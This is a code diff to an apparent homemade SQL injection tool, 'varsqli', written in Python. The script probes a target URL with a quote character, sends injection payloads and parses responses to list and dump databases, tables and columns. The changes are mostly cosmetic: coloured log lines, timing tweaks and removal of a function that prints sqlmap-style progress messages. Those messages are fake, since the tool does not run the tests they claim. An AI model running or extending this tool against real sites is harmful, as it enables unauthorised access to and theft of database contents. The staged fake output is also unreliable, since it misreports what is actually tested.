@@ -1,6 +1,4 @@
-# V2.1.15 - Pro 
-# Cyber Security
-# Anonymous VNPC
+# socket denial
 import requests
 import argparse
 import re
@@ -232,7 +230,7 @@ if args.url:
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable")
     time.sleep(1)
     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL inline queries'")
-    time.sleep(3)
+    time.sleep(1)
     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Generic UNION query (NULL) - 1 to 20 columns'")
     time.sleep(4)
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
@@ -242,7 +240,6 @@ if args.url:
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " target URL appears to have 11 columns in query")
     time.sleep(1)
     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")
-    time.sleep(1)
     check_vuln = "%27"
     checks = requests.get(url + check_vuln)
     if "at line" in checks.text:
@@ -259,7 +256,6 @@ if args.url:
                     if check_conn.status_code == 200:
                         pass
                         exploits = requests.get(url + payload)
-                        
                         if "The used SELECT" in exploits.text:
                             pass
                         else:
@@ -304,7 +300,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         # checking find
                                         check_find = r"\b\w+::\b"
                                         find_all = re.findall(check_find, html_content)
-                                        print("[INFO] back-end MySQL : MySQL >= x.x")
+                                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " back-end MySQL : MySQL >= x.x")
                                         print("available databases [2]:")
                                         for dbs in find_all:
                                             dbs_name = dbs.replace("::", " ")
@@ -339,11 +335,11 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                         find_data = r"\b\w+::\b"
                                                         findall_all = re.findall(find_data, html_content)
                                                         for dump in findall_all:
-                                                            dump_dbs = dump.replace("::", "")
+                                                            dump_dbs = dump.replace("::", "\n")
                                                             print(f"+-------------------+")
                                                             print(f"| {table_names} - {columns_name}")
                                                             print(f"+-------------------+")
-                                                            print(f"| {columns_name} : {dump_dbs} ")
+                                                            print(f"| {columns_name} : {dump_dbs}")
                                                             print(f"+-------------------+")
                                                             exit()
                                                     dump()
@@ -375,7 +371,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                             print(split_num)
                                             for tables_dump in find_all:
                                                 tables_name = tables_dump.replace("::", "")
-                                                print("[INFO] fetching tables name : {}".format(tables_name))
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                 time.sleep(0.30)
                                             print('+----------------------------+')
                                             num_tab = 0
@@ -418,16 +414,20 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                             html_content = get_content.text
                                             find_checking = r"\b\w+::\b"
                                             find_all = re.findall(find_checking, html_content)
+                                            print(split_num)
                                             for column_dump in find_all:
+                                                tables_name = tables_dump.replace("::", "")
                                                 columns_name = column_dump.replace("::", "")
-                                                print("[INFO] fetching database tables on columns name : {}".format(columns_name))
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
                                                 time.sleep(0.30)
+                                                print()
                                             print("+-----------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
                                                 print("|", tables_name)
+                                                time.sleep(0.30)
                                             print("+----------------------------+")
                                             print("Find {} Columns".format(num_tab))
                                             print("")
@@ -449,18 +449,8 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                     check_conn = requests.get(url + payload)
                     if check_conn.status_code == 200:
                         pass
-                        def hehe():
-                            print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'Generic UNION query (NULL) - 1 to 20 columns'")
-                            time.sleep(4)
-                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
-                            time.sleep(1)
-                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test")
-                            time.sleep(1)
-                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " target URL appears to have 11 columns in query")
-                            time.sleep(1)
-                            print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")                        
-                        
                         exploits = requests.get(url + payload)
+                        
                         if "The used SELECT" in exploits.text:
                             pass
                         else:
@@ -538,7 +528,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                         find_data = r"\b\w+::\b"
                                                         findall_all = re.findall(find_data, html_content)
                                                         for dump in findall_all:
-                                                            dump_dbs = dump.replace("::", "")
+                                                            dump_dbs = dump.replace("::", "\n")
                                                             print(f"+-------------------+")
                                                             print(f"| {table_names} - {columns_name}")
                                                             print(f"+-------------------+")
@@ -574,7 +564,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                             print(split_num)
                                             for tables_dump in find_all:
                                                 tables_name = tables_dump.replace("::", "")
-                                                print("[INFO] fetching tables name : {}".format(tables_name))
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                 time.sleep(0.30)
                                             print('+----------------------------+')
                                             num_tab = 0
@@ -619,8 +609,9 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                             find_all = re.findall(find_checking, html_content)
                                             print(split_num)
                                             for column_dump in find_all:
+                                                tables_name = tables_dump.replace("::", "")
                                                 columns_name = column_dump.replace("::", "")
-                                                print("[INFO] fetching database tables on columns name : {}".format(columns_name))
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
                                                 time.sleep(0.30)
                                             print('+----------------------------+')
                                             num_tab = 0
@@ -628,6 +619,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
                                                 print("|", tables_name)
+                                                time.sleep(0.30)
                                             print("+----------------------------+")
                                             print("Find {} Columns".format(num_tab))
                                             print("")
